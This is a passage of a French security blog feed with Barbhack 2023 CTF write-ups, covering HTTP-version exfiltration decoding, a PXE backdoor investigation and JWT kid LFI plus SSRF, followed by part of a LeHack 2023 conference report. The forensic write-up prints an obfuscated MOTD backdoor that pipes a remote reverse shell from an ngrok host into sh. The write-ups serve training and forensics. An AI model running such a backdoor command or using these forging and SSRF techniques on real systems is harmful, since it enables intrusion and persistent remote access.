class=&quot;s1&quot;&gt;&apos;$_=pack&quot;B*&quot;,$_&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Si nous dÃ©composons cette commande nous obtenons :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tshark -r Discretexfi.pcap -Y &apos;http.request.method == &quot;GET&quot;&apos;&lt;/code&gt; permet dâ€™extraire les informations du fichier de capture avec le filtre utilisÃ© sur wireshark.&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;122702  12.714845  192.168.0.2 â†’ 192.168.0.10 HTTP 217 GET /bit HTTP/1.1 
122712  12.715613  192.168.0.2 â†’ 192.168.0.10 HTTP 217 GET /bit HTTP/1.1 
122722  12.716368  192.168.0.2 â†’ 192.168.0.10 HTTP 217 GET /bit HTTP/1.1 
122732  12.717119  192.168.0.2 â†’ 192.168.0.10 HTTP 217 GET /bit HTTP/1.0 
122742  12.717882  192.168.0.2 â†’ 192.168.0.10 HTTP 222 GET /lastbits HTTP/1.0&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;awk -F &apos; &apos; &apos;{print $10}&apos;&lt;/code&gt; permet de nâ€™extraire que le dernier champs, Ã  savoir &lt;strong&gt;HTTP/1.1&lt;/strong&gt; ou &lt;strong&gt;HTTP/1.0&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;HTTP/1.1
HTTP/1.1
HTTP/1.1
HTTP/1.0
HTTP/1.0&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cut -d &apos;.&apos; -f 2&lt;/code&gt; permet de ne garder que le dernier chiffre de cette version, soit &lt;strong&gt;1&lt;/strong&gt; ou &lt;strong&gt;0&lt;/strong&gt;.&lt;/p&gt;

    &lt;blockquote&gt;
      &lt;p&gt;1
1
1
0
0&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sed &apos;:a;N;$!ba;s/\n//g; s/ //g&apos;&lt;/code&gt; permet de retirer les retours Ã  la ligne&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;11100&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;perl -lpe &apos;$_=pack&quot;B*&quot;,$_&apos;&lt;/code&gt; permet de convertir la suite binaire en ascii&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Nous obtenons alors le rÃ©sultat suivant :&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-ascii&quot;&gt;ï¿½0ï¿½9ï¿½6ï¿½ï¿½4ï¿½2ï¿½9ï¿½22ï¿½ï¿½2cï¿½lices et des plaisirs gustatifs, se cache en moi une passion brÃ»lante pour les biÃ¨res. DerriÃ¨re mon sourire et mes conversations animÃ©es, se trouve un amour profond et sincÃ¨re pour cette boisson brassicole.
La biÃ¨re va bien au-delÃ  d&apos;une simple boisson pour moi. C&apos;est une vÃ©ritable expÃ©rience sensorielle, un voyage palpitant Ã  travers les saveurs, les arÃ´mes et les textures. Chaque gorgÃ©e est une dÃ©couverte, une exploration des possibilitÃ©s infinies qu&apos;offre le monde brassicole.
J&apos;adore me plonger dans la diversitÃ© des biÃ¨res, partir Ã  la recherche de nouvelles variÃ©tÃ©s, de brasseries artisanales et de crÃ©ations audacieuses. Chaque biÃ¨re est unique, racontant une histoire qui m&apos;envoÃ»te et me transporte vers de nouveaux horizons gustatifs.
brb{hTTp_vErSi0n_iS_th3_W44444y}
La dÃ©gustation de biÃ¨re est un art que je chÃ©ris. Je savoure chaque gorgÃ©e, laissant la biÃ¨re se rÃ©pandre sur ma langue et rÃ©vÃ©ler ses secrets. Les saveurs se dÃ©ploient avec grÃ¢ce, les notes fruitÃ©es, Ã©picÃ©es ou maltÃ©es dansent dans ma bouche, m&apos;invitant Ã  explorer davantage.
Mais ma passion pour les biÃ¨res ne s&apos;arrÃªte pas Ã  la dÃ©gustation. Je suis captivÃ© par l&apos;histoire et la culture brassicole, par les traditions et les techniques de brassage. Je m&apos;imprÃ¨gne de chaque dÃ©tail, chaque anecdote qui entoure cette boisson millÃ©naire, nourrissant ma soif de connaissances brassifï¿½ï¿½ï¿½ï¿½\
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Dans lâ€™ensemble de ce texte nous retrouvons le flag : &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;brb{hTTp_vErSi0n_iS_th3_W44444y}&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;</content><author><name></name></author><category term="Barbhack-2023" /><summary type="html">Discretexfi</summary></entry><entry><title type="html">Rip My PXE</title><link href="http://localhost:4000/barbhack-2023/RipMyPXE.html" rel="alternate" type="text/html" title="Rip My PXE" /><published>2023-08-26T00:00:00+02:00</published><updated>2023-08-26T00:00:00+02:00</updated><id>http://localhost:4000/barbhack-2023/RipMyPXE</id><content type="html" xml:base="http://localhost:4000/barbhack-2023/RipMyPXE.html">&lt;h1 id=&quot;rip_my_pxe&quot;&gt;RIP_My_PXE&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;CatÃ©gorie :&lt;/strong&gt; Forensic&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/ripmypxe/enonce-rip-my-pxe.png&quot; alt=&quot;Enonce&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nous rÃ©cupÃ©rons ici une machine virtuelle que nous importons dans virtualbox.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/ripmypxe/upload-vm.png&quot; alt=&quot;upload-vm&quot; /&gt;&lt;/p&gt;

&lt;p&gt;AprÃ¨s avoir dÃ©marrÃ© cette machine nous obtenons la mire dâ€™authentification pour lâ€™utilisateur &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ubuntu&lt;/code&gt;  :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/ripmypxe/user-ubuntu.png&quot; alt=&quot;Ubuntu user&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Le mot de passe &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ubuntu&lt;/code&gt; est valide et nous permet de dÃ©verrouiller la session.&lt;/p&gt;

&lt;p&gt;Nous devons retrouver les traces dâ€™un shell, donc nous cherchons Ã  observer dans un premier temps les processus, lâ€™historique de commande de lâ€™utilisateur, les fichiers disponibles, les historiques de navigation web et les fichiers de log.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Historique de commande&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/ripmypxe/command-history.png&quot; alt=&quot;command-history&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Processus&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/ripmypxe/ps-aux.png&quot; alt=&quot;ps-aux&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Historique de navigation&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/ripmypxe/firefox-history.png&quot; alt=&quot;firefox-history&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Fichiers de lâ€™utilisateur&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/ripmypxe/documents.png&quot; alt=&quot;documents&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Fichiers de logs&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Nous ne trouvons rien dans les fichiers de logs par dÃ©faut et notre attention se porte sur le dossier &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;installer&lt;/code&gt; prÃ©sent dans &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/log/&lt;/code&gt; :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/ripmypxe/log-subiquity.png&quot; alt=&quot;log-subiquity&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nous retrouvons dans le fichier &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;subiquity-server-debug.log.2368&lt;/code&gt; la commande qui a permis dâ€™insÃ©rer la backdoor :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/ripmypxe/backdoor-command.png&quot; alt=&quot;backdoor-command&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;echo -n Y3VybCBodHRwczovL3JldmVyc2Utc2hlbGwuc2gvMC50Y3AuZXUubmdyb2suaW86MTcyMjQgfCBzaCAgJg== | base64 -d | sh&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /target/etc/update-motd.d/00-header
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Lâ€™opÃ©ration effectuÃ© ici est le dÃ©codage de la chaÃ®ne en base 64 Ã  la fin du fichier &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/update-motd.d/00-header&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Nous dÃ©codons donc la chaÃ®ne de base 64 :&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl https://reverse-shell.sh/0.tcp.eu.ngrok.io:17224 | sh  &amp;amp;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Cette commande va donc rÃ©cupÃ©rer un reverse shell et le lancer Ã  chaque fois que lâ€™affichage du motd sera dÃ©clenchÃ©. Nous obtenons donc la premiÃ¨re partie du flag &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;brb{0.tcp.eu.ngrok.io:17224:nom_du_binaire}&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Nous devons trouver le nom du binaire qui Ã  dÃ©clenchÃ© la backdoor, donc par consÃ©quent, lâ€™affichage du motd. Par dÃ©faut le motd est affichÃ© Ã  chaque nouvelle connexion distante sur le systÃ¨me, nous avons aperÃ§u lâ€™utilisation de commandes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;telnet&lt;/code&gt; et &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ftp&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Nous tentons le flag : &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;brb{0.tcp.eu.ngrok.io:17224:ssh}&lt;/code&gt;&lt;/strong&gt; qui sera validÃ© par la plateforme du ctf.%&lt;/p&gt;</content><author><name></name></author><category term="Barbhack-2023" /><summary type="html">RIP_My_PXE</summary></entry><entry><title type="html">Intleaks</title><link href="http://localhost:4000/barbhack-2023/intleaks.html" rel="alternate" type="text/html" title="Intleaks" /><published>2023-08-26T00:00:00+02:00</published><updated>2023-08-26T00:00:00+02:00</updated><id>http://localhost:4000/barbhack-2023/intleaks</id><content type="html" xml:base="http://localhost:4000/barbhack-2023/intleaks.html">&lt;h1 id=&quot;intleaks&quot;&gt;&lt;strong&gt;INTLEAKS&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;Nous nous attaquons au challenge Web INTLEAKS. Il sâ€™agit dâ€™une application dont le but est de partager des documents dÃ©voilÃ©s par des lanceurs dâ€™alertes. La page dâ€™accueil indique que deux serveurs interne hÃ©bergent des fichiers dÃ©voilÃ©s. Lâ€™un dâ€™entre eux comprend les fichiers approuvÃ©s, et lâ€™autre ceux qui ne lâ€™ont pas Ã©tÃ©. Lâ€™objectif de ce challenge est dâ€™atteindre un fichier secret qui nâ€™a pas encore Ã©tÃ© approuvÃ© et dÃ©voilÃ©.&lt;/p&gt;

&lt;p&gt;Dans un premier temps, nous remarquons sur la page dâ€™accueil quâ€™un bouton permet aux utilisateurs de sâ€™authentifier Ã  lâ€™API en tant quâ€™anonyme.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/intleaks/image-20230901133133813.png&quot; alt=&quot;image-20230901133133813&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ce bouton requÃªte le endpoint &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/api/auth&lt;/code&gt;, nous dÃ©livrant un jeton JWT :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/intleaks/image-20230901132724512.png&quot; alt=&quot;image-20230901132724512&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nous analysons le contenu de celui-ci. Nous constatons quâ€™il est signÃ© Ã  lâ€™aide de lâ€™algorithme HS512, symÃ©trique, dont la clÃ© est ici Ã  priori stockÃ©e dans le fichier indiquÃ© par lâ€™entÃªte Â«Â kidÂ Â». Nous notons Ã©galement la prÃ©sence dâ€™un paramÃ¨tre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;acl&quot;Â : Â &quot;anon&quot;&lt;/code&gt; dans le corps de ce jeton.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/intleaks/image-20230901132741789.png&quot; alt=&quot;image-20230901132741789&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Il est possible dâ€™identifier certains endpoints de lâ€™API depuis le code source de la page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/intleaks/image-20230901132754256.png&quot; alt=&quot;image-20230901132754256&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Le endpoint &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/api/me&lt;/code&gt; permet dâ€™afficher nos privilÃ¨ges en se basant sur notre JWT.&lt;/p&gt;

&lt;p&gt;Toujours depuis la page dâ€™accueil, nous pouvons accÃ©der Ã  des documents. Ceux-ci correspondent aux documents ayant Ã©tÃ© Â«Â dÃ©voilÃ©s et approuvÃ©sÂ Â».&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/intleaks/image-20230901132829256.png&quot; alt=&quot;image-20230901132829256&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nous remarquons un paramÃ¨tre dans lâ€™URL correspondant au document Ã  lire. En manipulant ce paramÃ¨tre, un message indique que le nom de fichier doit se terminer par &lt;em&gt;.disclosed&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/intleaks/image-20230901132842161.png&quot; alt=&quot;image-20230901132842161&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nous parvenons Ã©galement Ã  dÃ©clencher dâ€™autres messages dâ€™erreurs, indiquant que cette fonctionnalitÃ© Ã©met des requÃªtes HTTP de la forme suivanteÂ :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;http://files.internal{location}&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;files.internal&lt;/strong&gt; correspond donc au serveur dont les fichiers ont Ã©tÃ© Â«Â dÃ©voilÃ©s et approuvÃ©sÂ Â».&lt;/p&gt;

&lt;p&gt;Nous remarquons ensuite que les caractÃ¨res Â«Â ?Â Â» et Â«Â #Â Â» nous permettent dâ€™Ã©chapper la vÃ©rification de lâ€™extension. Le directory listing Ã©tant activÃ© sur &lt;strong&gt;files.internal&lt;/strong&gt;, nous parvenons ainsi Ã  lister les fichiers prÃ©sents sur ce serveur web, et Ã  y accÃ©der en lecture. Nous parvenons notamment Ã  lire les fichiers source &lt;em&gt;app.py&lt;/em&gt; et &lt;em&gt;jwt.py&lt;/em&gt;, Ã©galement prÃ©sents sur ce serveur et contenant le code source des fonctionnalitÃ©s de lâ€™API.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/intleaks/image-20230901132905960.png&quot; alt=&quot;image-20230901132905960&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A partir de ce code source, nous pouvons comprendre comment sont gÃ©nÃ©rÃ©s les jetons JWT servant Ã  gÃ©rer lâ€™authentification. A partir du code source, nous identifions une LFI (Local File Inclusion) dans lâ€™entÃªte JKI du JWT.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/intleaks/image-20230901132931988.png&quot; alt=&quot;image-20230901132931988&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Cet entÃªte prend en entrÃ©e un fichier correspondant Ã  la clÃ© permettant de signer le jeton JWT. Ainsi, sÃ©lectionner en entrÃ©e un fichier dont nous connaissons le contenu revient Ã  connaitre la clÃ© permettant de signer le jeton.&lt;/p&gt;

&lt;p&gt;De plus, nous remarquons quâ€™un JWT est considÃ©rÃ© comme administrateur sâ€™il contient, dans son corps, lâ€™entrÃ©e suivanteÂ :&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;acl&quot;Â : &quot;admin&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/intleaks/image-20230901132956918.png&quot; alt=&quot;image-20230901132956918&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nous cherchons donc Ã  modifier le contenu de notre JWT. Ayant obtenu le contenu de quelques fichiers sur le serveur, par exemple Â«Â app.pyÂ Â», nous pouvons utiliser ce fichier comme clÃ© pour gÃ©nÃ©rer une signature valide, et spÃ©cifier le chemin vers ce mÃªme fichier dans lâ€™entÃªteÂ Â«Â kidÂ Â» Ã  lâ€™aide de la LFI.&lt;/p&gt;

&lt;p&gt;Nous rÃ©alisons donc un script python afin de gÃ©nÃ©rer un jeton JWT administrateur valide, prenant en compte les Ã©lÃ©ments prÃ©cÃ©demment Ã©noncÃ©s.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/intleaks/image-20230901133015565.png&quot; alt=&quot;image-20230901133015565&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nous validons ensuite que le JWT forgÃ© est bien valide en nous connectant Ã  lâ€™application.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/intleaks/image-20230901132132341.png&quot; alt=&quot;image-20230901132132341&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nous sommes Ã  prÃ©sent en mesure de requÃªter le endpoint &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/api/leaks&lt;/code&gt;. Le serveur nous retourne le nom du fichier Â«Â cachÃ©Â Â» recherchÃ©, et dâ€™aprÃ¨s le code source, nous pouvons comprendre que celui est hÃ©bergÃ© sur le serveur Â«Â whisteblower.internalÂ Â».&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/intleaks/image-20230901133036443.png&quot; alt=&quot;image-20230901133036443&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/intleaks/image-20230901132048027.png&quot; alt=&quot;image-20230901132048027&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nâ€™ayant pas accÃ¨s directement Ã  ce serveur, nous cherchons Ã  forcer lâ€™application Ã  le requÃªter via une attaque de type SSRF.&lt;/p&gt;

&lt;p&gt;Pour ce faire, nous pouvons rÃ©utiliser le endpoint Â«Â /api/documentÂ Â» et manipuler le paramÃ¨tre &lt;strong&gt;location&lt;/strong&gt; afin de forger une requÃªte vers le serveur whistleblower.internalÂ :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;http://internal.fs@whisteblower.internal/&lt;strong&gt;{leak_file}&lt;/strong&gt;?.disclosed&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Nous avons ainsi gagnÃ© accÃ¨s en lecture au fichier recherchÃ© et rÃ©solu ce challengeÂ :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/intleaks/image-20230901133052785.png&quot; alt=&quot;image-20230901133052785&quot; /&gt;&lt;/p&gt;</content><author><name></name></author><category term="Barbhack-2023" /><summary type="html">INTLEAKS</summary></entry><entry><title type="html">Le hack 2023</title><link href="http://localhost:4000/articles/lehack_2023.html" rel="alternate" type="text/html" title="Le hack 2023" /><published>2023-06-30T00:00:00+02:00</published><updated>2023-06-30T00:00:00+02:00</updated><id>http://localhost:4000/articles/lehack_2023</id><content type="html" xml:base="http://localhost:4000/articles/lehack_2023.html">&lt;h1 id=&quot;advens-Ã -lÃ©vÃ¨nement-lehack-2023&quot;&gt;Advens Ã  lâ€™Ã©vÃ¨nement LeHack 2023&lt;/h1&gt;

&lt;p&gt;Cette annÃ©e encore, notre Redteam Ã©tait au rendez-vous pour assister Ã  lâ€™Ã©vÃ¨nement LeHack.&lt;/p&gt;

&lt;p&gt;Existant depuis 2001 (auparavant nommÃ©e â€œNuit du Hackâ€ jusquâ€™en 2019), cette convention propose de rÃ©unir les passionnÃ©s de sÃ©curitÃ© informatique autour de divers stands dâ€™entreprises du secteur mais aussi des associations et Ã©coles spÃ©cialisÃ©es.&lt;/p&gt;

&lt;p&gt;Des confÃ©rences techniques ont lieu tout au long de lâ€™Ã©vÃ¨nement et laissent divers intervenants prÃ©senter les rÃ©sultats de leurs sujets de recherche dont voici quelques rÃ©sumÃ©s :&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;confÃ©rence-du-driver-windows-Ã -ledr-par-aurÃ©lien-chalot&quot;&gt;ConfÃ©rence â€œDu Driver Windows Ã  lâ€™EDRâ€ par &lt;a href=&quot;https://twitter.com/Defte_&quot;&gt;AurÃ©lien CHALOT&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;&lt;em&gt;De nos jours, pour dÃ©tecter les malwares, les antivirus reposent principalement sur lâ€™analyse dynamique. Pour Ã©tudier le comportement dâ€™un malware, il est nÃ©cessaire que les solutions dâ€™antivirus aient le moyen dâ€™intercepter ses actions. Pour cela, Microsoft a ajoutÃ© au sein de lâ€™OS Windows ce que lâ€™on appelle des kernel callbacks. Ces kernels callbacks sont en fait des fonctions de lâ€™API Windows qui permettent, moyennant un niveau de privilÃ¨ge fort, dâ€™intercepter les actions dâ€™un malware. Pour avoir les privilÃ¨ges suffisants, il est nÃ©cessaire que ces fonctions soient utilisÃ©es par un certain type de composant : les drivers.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Source : &lt;a href=&quot;https://lehack.org/fr/track/du-driver-windows-a-ledr/&quot;&gt;https://lehack.org/fr/track/du-driver-windows-a-ledr/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Lors de cette confÃ©rence, AurÃ©lien a retracÃ© lâ€™historique des divers moyens utilisÃ©s au cours des derniÃ¨res dÃ©cennies pour protÃ©ger nos systÃ¨mes contre les logiciels malveillants. La technicitÃ© et lâ€™innovation des attaquants Ã©voluant au rythme asynchrone des Ã©volutions techniques permettant de repÃ©rer ces derniers, nous en sommes alors Ã  lâ€™Ã©poque des EDR (Endpoint detection and response).&lt;/p&gt;

&lt;p&gt;Câ€™est dans un objectif dâ€™auto-apprentissage quâ€™AurÃ©lien a alors dÃ©cidÃ© dâ€™entreprendre le dÃ©veloppement dâ€™un â€œEDR maisonâ€. Cet EDR utilisant les fonctionnalitÃ©s de lâ€™API Windows (et particuliÃ¨rement les kernels callbacks, dont les spÃ©cificitÃ©s sont prÃ©sentÃ©es en confÃ©rence), il faudra alors dÃ©velopper un driver.&lt;/p&gt;

&lt;p&gt;Au travers dâ€™exemples de code, la confÃ©rence met alors lâ€™accent sur la complexitÃ© liÃ©e Ã  ce type de dÃ©veloppement bas niveau, ainsi que les contraintes que les EDR doivent alors surmonter avant mÃªme de dÃ©montrer leur efficacitÃ©.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;confÃ©rence-parasitage-de-serveur-for-fun-and-profit-de-damien-virtualabs-cauquil&quot;&gt;ConfÃ©rence &lt;strong&gt;Parasitage de serveur for fun and profit&lt;/strong&gt; de &lt;a href=&quot;https://twitter.com/virtualabs&quot;&gt;Damien &lt;em&gt;Virtualabs&lt;/em&gt; CAUQUIL&lt;/a&gt;.&lt;/h2&gt;

&lt;p&gt;&lt;em&gt;Les serveurs et applications web reposent sur des technologies qui peuvent dans certains cas Ãªtre dÃ©tournÃ©es et utilisÃ©es Ã  des fins non-prÃ©vues. Il est ainsi possible de parasiter un serveur ou une application en y stockant des donnÃ©es sans que ces derniers ne sâ€™en rendent compte tout en permettant leur rÃ©cupÃ©ration dans un dÃ©lai plus ou moins court, et ce sans nÃ©cessitÃ© dâ€™authentification ou que cela soit facilement dÃ©tectable !&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Source : &lt;a href=&quot;https://lehack.org/track/parasitage-de-serveur-for-fun-and-profit/&quot;&gt;https://lehack.org/track/parasitage-de-serveur-for-fun-and-profit/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Nous allons vous prÃ©senter cette mÃ©thode simple et ingÃ©nieuse de dÃ©tournement dâ€™application pour stocker des fichiers sans mÃªme Ãªtre authentifiÃ©.&lt;/p&gt;

&lt;p&gt;Prenons comme exemple une application disposant dâ€™une mire dâ€™authentification :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/articles/lehack23/Parasite1.png&quot; alt=&quot;authent&quot; title=&quot;Notre application avec une mire d&apos;authentification&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nous constatons que le formulaire pour ajouter son adresse mail ne contrÃ´le pas le format du texte renseignÃ©, ni sa longueur.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Session 1 :&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/articles/lehack23/Parasite2.png&quot; alt=&quot;email&quot; title=&quot;Formulaire email&quot; /&gt;&lt;/p&gt;

&lt;p&gt;De plus, un cookie stocke la valeur Ã©crite dans le formulaire.
Câ€™est un cookie dont le paramÃ¨tre &lt;em&gt;durÃ©e maximum&lt;/em&gt; est fixÃ© Ã  &lt;em&gt;Session&lt;/em&gt;. Cela signifie que si lâ€™on recharge la page dâ€™authentification le cookie reste le mÃªme et la valeur dâ€™email rÃ©apparaÃ®t dans le formulaire. Si nous fermons la page ou le navigateur, le cookie est supprimÃ© cÃ´tÃ© client et le formulaire &lt;em&gt;Email address&lt;/em&gt; nâ€™est plus auto-rempli.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Session 2 :&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/articles/lehack23/Parasite3.png&quot; alt=&quot;new&quot; title=&quot;Nouveau cookie&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Cependant, cela ne signifie pas quâ€™il ait Ã©galement bien Ã©tÃ© supprimÃ© cÃ´tÃ© serveur. Des cookies de sessions et les informations qui y sont liÃ©es peuvent Ãªtre stockÃ©s des heures, des jours ou des mois aprÃ¨s la fin de la session, en fonction de la configuration du serveur.&lt;/p&gt;

&lt;p&gt;Par exemple, si nous regardons sur le serveur hÃ©bergeant lâ€™application, nous constatons que les cookies des deux sessions sont prÃ©sents, mÃªme si la premiÃ¨re est terminÃ©e.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/articles/lehack23/Parasite4.png&quot; alt=&quot;ls&quot; title=&quot;ls cookie&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nous pouvons y retrouver la valeur que nous avions entrÃ©e dans le formulaire &lt;em&gt;Email address&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/articles/lehack23/Parasite5.png&quot; alt=&quot;cat&quot; title=&quot;cat cookie&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nous souhaitons alors stocker le contenu dâ€™un fichier Ã  la place du message &lt;em&gt;Bonjour&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Nous encodons une image PNG en base 64. Cela fonctionne avec tout autre type de fichier.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/articles/lehack23/Parasite6.png&quot; alt=&quot;png&quot; title=&quot;Png en base 64&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nous renseignons notre image encodÃ©e en base 64 dans le formulaire &lt;em&gt;Email address&lt;/em&gt; et nous sauvegardons la valeur du cookie de notre session.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/articles/lehack23/Parasite7.png&quot; alt=&quot;depot&quot; title=&quot;Depot de l&apos;image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lâ€™image est bien Ã©crite sur le serveur :&lt;/p&gt;

